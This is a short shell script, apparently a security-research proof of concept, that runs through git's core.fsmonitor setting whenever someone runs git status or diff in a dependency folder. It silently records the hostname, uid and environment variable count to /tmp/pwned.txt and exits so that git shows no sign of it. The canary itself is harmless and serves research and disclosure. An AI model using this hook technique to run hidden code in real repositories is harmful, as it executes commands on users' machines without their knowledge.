#!/bin/sh
# Benign canary #2: fires via core.fsmonitor on `git status`/`diff` inside
# deps/corpus. Exits 1 with an invalid protocol reply so git silently falls
# back to normal scanning; the triggering command still succeeds.
{
  echo "POC_FSMON_EXEC host=$(hostname) uid=$(id -u)"
  echo "env_count=$(env | wc -l | tr -d ' ')"
  date -u +"utc=%Y-%m-%dT%H:%M:%SZ"
} > /tmp/pwned.txt
echo "fsmonitor: canary written to /tmp/pwned.txt" >&2
exit 1
